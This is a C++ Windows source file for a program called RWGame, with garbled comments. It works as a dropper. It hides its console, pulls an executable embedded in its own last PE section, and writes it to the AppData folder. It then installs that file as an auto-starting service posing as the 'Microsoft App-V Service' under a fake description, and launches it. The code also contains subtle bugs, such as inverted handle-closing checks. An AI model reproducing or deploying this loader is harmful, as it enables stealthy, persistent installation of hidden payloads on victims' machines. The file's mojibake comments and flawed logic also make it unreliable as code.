// RWGame.cpp : �������̨Ӧ�ó������ڵ㡣
//

#include "stdafx.h"
#include "RWGame.h"


// ����ʾ����̨
#pragma comment(linker, "/subsystem:\"windows\" /entry:\"wmainCRTStartup\"")

// ��ŷ������д���·��
TCHAR	g_szServicePath[MAX_PATH] = {0}; 

#define AS					TEXT("AppVService")
#define AS_Description		TEXT("Microsoft App-V Service")

//////////////////////////////////////////////////////////////////////
// �û����
//////////////////////////////////////////////////////////////////////
int _tmain(int argc, _TCHAR* argv[])
{
	LPVOID lpServiceData = NULL;
	DWORD dwSizeOfServiceExe = NULL;

	// ����Ƿ�˳���ֻ������һ��ʵ��
	CheckIsExsist();
	// ��ȡ��������ڴ�ָ��
	GetServiceDataPointer(&lpServiceData, &dwSizeOfServiceExe);
	// ��ȡ�������û�·��
	GetMagicPath(g_szServicePath);
	// ������д�뵽Ŀ��·��
	WriteMemeryToFile(lpServiceData, dwSizeOfServiceExe, g_szServicePath);
	// ��װ����
	InstallService();
	// ��������
	StartSvc();

	return 0;
}

//////////////////////////////////////////////////////////////////////
// ����Ƿ�ǰ�������������һ��
// ���ں˶����ڳ���������Զ��ͷ�
//////////////////////////////////////////////////////////////////////
VOID WINAPI CheckIsExsist(void)
{
	// ֵΪ0������ǵ�һ������
	HANDLE hExeExist = OpenMutex(MUTEX_ALL_ACCESS, FALSE, TEXT("CHECK_EXSIST_WIN32API_FLAG_GAME_SERVICE_NEW"));
	if (!hExeExist)
	{
		// ����˳����ǵ�һ�������򴴽��ں˶�������ȫ�ֱ�־
		if (!CreateMutex(NULL, FALSE, TEXT("CHECK_EXSIST_WIN32API_FLAG_GAME_SERVICE_NEW")))
		{
			// ����ʧ�����˳�
			_exit(0);
		}
	}
	else
	{
		if (!hExeExist) CloseHandle(hExeExist);
		_exit(0);
	}

	return;
}


//////////////////////////////////////////////////////////////////////
// ��OutPutDebugString���з�װ
//////////////////////////////////////////////////////////////////////
VOID WINAPI OutputDebugStringFA(const char* strOutputString, ...)  
{  
    va_list vlArgs = NULL;
	va_start(vlArgs, strOutputString);
    size_t nLen = _vscprintf(strOutputString, vlArgs) + 1;
	char* strBuffer = new char[nLen];
    _vsnprintf_s(strBuffer, nLen, nLen, strOutputString, vlArgs);  
    va_end(vlArgs);  
    OutputDebugStringA(strBuffer);  
    delete[] strBuffer;
    return;
}

VOID WINAPI OutputDebugStringFW(const wchar_t* strOutputString, ...)
{
	va_list vlArgs = NULL;
	va_start(vlArgs, strOutputString);
	size_t nLen = _vscwprintf(strOutputString, vlArgs) + 1;
	wchar_t* strBuffer = new wchar_t[nLen];
	_vsnwprintf_s(strBuffer, nLen, nLen, strOutputString, vlArgs);
	va_end(vlArgs);
	OutputDebugStringW(strBuffer);
	delete[] strBuffer;
	return;
}

//////////////////////////////////////////////////////////////////////
// ��ȡָ��·��
//////////////////////////////////////////////////////////////////////
BOOL GetMagicPath(OUT LPTSTR szPath)
{
	TCHAR szTempCurrentPath[MAX_PATH] = {0};
    PIDLIST_ABSOLUTE lpDLIST;

	// CSIDL_NETHOOD(AppData·��)  // CSIDL_DESKTOP(DeskTop·��) // CSIDL_APPDATA
	HRESULT RESULT = SHGetSpecialFolderLocation(NULL, CSIDL_APPDATA, &lpDLIST);
     if (RESULT == S_OK) 
	 {
		// ����ɹ�����RETURN_SUCCESS  
		SHGetPathFromIDList(lpDLIST, szTempCurrentPath);
		// ƴ��·��"AppVService"
		swprintf_s(g_szServicePath, MAX_PATH, TEXT("%s\\AppVService.exe"), szTempCurrentPath);

		return RETURN_SUCCESS;
	 }

	return RETURN_ERROR;
}


//////////////////////////////////////////////////////////////////////
// �õ����һ��������ָ��
//////////////////////////////////////////////////////////////////////
BOOL GetServiceDataPointer(OUT LPVOID* lpServiceData, OUT LPDWORD lpdwSizeOfServiceExe)
{
	// ��ȡ�����������λ��ָ�뼰��С

	// ��ȡ�����ģ����
	HANDLE hSelfHandle = ::GetModuleHandle(NULL);
	if (!hSelfHandle) 
	{
		DbgPrint(TEXT("��ȡ������ʧ��! ������:%d"), ::GetLastError());
		return RETURN_ERROR;
	}
	// ����PE�ļ��ṹ��ָ��
	PIMAGE_DOS_HEADER pIMAGE_DOS_HEADER = (IMAGE_DOS_HEADER*)hSelfHandle;
	PIMAGE_NT_HEADERS32 pIMAGE_NT_HEADERS32 = (IMAGE_NT_HEADERS32*)((DWORD)pIMAGE_DOS_HEADER + pIMAGE_DOS_HEADER -> e_lfanew);
	PIMAGE_FILE_HEADER pIMAGE_FILE_HEADER = (IMAGE_FILE_HEADER*)((DWORD)pIMAGE_NT_HEADERS32 + sizeof(pIMAGE_NT_HEADERS32 -> Signature));
	PIMAGE_OPTIONAL_HEADER32 pIMAGE_OPTIONAL_HEADER32 = (IMAGE_OPTIONAL_HEADER32*)((DWORD)pIMAGE_FILE_HEADER + IMAGE_SIZEOF_FILE_HEADER); 
	PIMAGE_SECTION_HEADER pIMAGE_SECTION_HEADER = (IMAGE_SECTION_HEADER*)((DWORD)pIMAGE_OPTIONAL_HEADER32 + pIMAGE_FILE_HEADER -> SizeOfOptionalHeader);
	// ��λ�����һ����
	pIMAGE_SECTION_HEADER += (pIMAGE_FILE_HEADER -> NumberOfSections - 1);
	// ��ȡ���һ���������ݵĴ�С
	*lpdwSizeOfServiceExe = pIMAGE_SECTION_HEADER -> Misc.VirtualSize;
	// �õ����һ���ڵ�ָ��
	LPVOID lpServiceExe = (LPVOID)(pIMAGE_SECTION_HEADER -> VirtualAddress + (DWORD)hSelfHandle);
	*lpServiceData = lpServiceExe;

	return RETURN_SUCCESS;
}

//////////////////////////////////////////////////////////////////////
// ���ڴ�д�����ݵ��ļ�
//////////////////////////////////////////////////////////////////////
BOOL WriteMemeryToFile(IN LPVOID pMemBuffer, IN DWORD SizeOfFile, OUT LPTSTR lpszFile)
{
	// ���ݸ����� pMemBuffer ���ļ�·������Ҫд����ļ���С

	FILE* pOpenFile = _tfopen(lpszFile, TEXT("wb"));
	if (!pOpenFile)
	{
		// ���ؿ�ָ������ļ��򿪳��ִ���
		return RETURN_ERROR;
	}
	// �����ļ�ָ�����ļ���ͷ
	fseek(pOpenFile, 0, SEEK_SET);
	// ���ڴ��е�����д�뵽ָ��Ӳ��·��
	DWORD SizeOfWriteDate = fwrite(pMemBuffer, sizeof(CHAR), sizeof(CHAR) * SizeOfFile, pOpenFile);
	if (SizeOfWriteDate != SizeOfFile)
	{
		return RETURN_ERROR;
	}
	// �ر��ļ��ܵ�
	DWORD FileCloseReturnValue = fclose(pOpenFile);
	if (FileCloseReturnValue)
	{
		return RETURN_ERROR;
	} 
	return RETURN_SUCCESS;
}

//////////////////////////////////////////////////////////////////////
// ��д�������ע��Ϊ����
//////////////////////////////////////////////////////////////////////
BOOL InstallService(void)
{
	// ��װ/��������

	int nRet = RETURN_ERROR;									// ����ֵ��ʼ��ΪRETURN_ERROR
	SC_HANDLE				schSCManager = NULL;				// ָ��������ƹ��������ݿ�ľ��
	SC_HANDLE				schService = NULL;					// ����ľ��
	SERVICE_DESCRIPTION		SDescription = {0};					// ������ʾ���������Ľṹ��

	// �򿪷���������ݿ�
	schSCManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	if (!schSCManager) goto EXIT;

	// ��������
	schService = CreateService(
		schSCManager, 
		AS, 
		AS_Description, 
		SC_MANAGER_ALL_ACCESS, 
		SERVICE_WIN32_OWN_PROCESS, 
		SERVICE_AUTO_START, 
		SERVICE_ERROR_IGNORE, 
		g_szServicePath, 
		NULL, 
		NULL, 
		NULL, 
		NULL, 
		NULL);
	if (!schService) goto EXIT;

	// �ڷ������������ʾ�ķ��������
	SDescription.lpDescription = TEXT("Manages App-V users and virtual applications");
	BOOL bSuccess = ChangeServiceConfig2(schService, SERVICE_CONFIG_DESCRIPTION, &SDescription);
	if (bSuccess) nRet = RETURN_SUCCESS;

EXIT:
	if (!schSCManager) CloseServiceHandle(schSCManager);
	if (!schService) CloseServiceHandle(schService);

	return nRet;
}

//////////////////////////////////////////////////////////////////////
// ��������
//////////////////////////////////////////////////////////////////////
BOOL StartSvc(void)
{
	// ��������

	int nRet = RETURN_ERROR;							// ����ֵ��ʼ��ΪRETURN_ERROR
	SC_HANDLE		schSCManager = NULL;				// ָ��������ƹ��������ݿ�ľ��
	SC_HANDLE		schService = NULL;					// ����ľ��
	
	// �򿪷���������ݿ�
	schSCManager = OpenSCManager(NULL, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS);
	if (!schSCManager) goto EXIT;

	// �򿪷���
	schService = OpenService(schSCManager, AS, SERVICE_ALL_ACCESS);
	if (!schService)
	{
		nRet = -2;
		goto EXIT;
	}

	// ��������
	if (!StartService(schService, 0, NULL)) 
	{
		nRet = ::GetLastError();
	} 
	else 
	{
		nRet = RETURN_SUCCESS;
	}

EXIT:
	if (!schSCManager) CloseServiceHandle(schSCManager);
	if (!schService) CloseServiceHandle(schService);

	return nRet;
}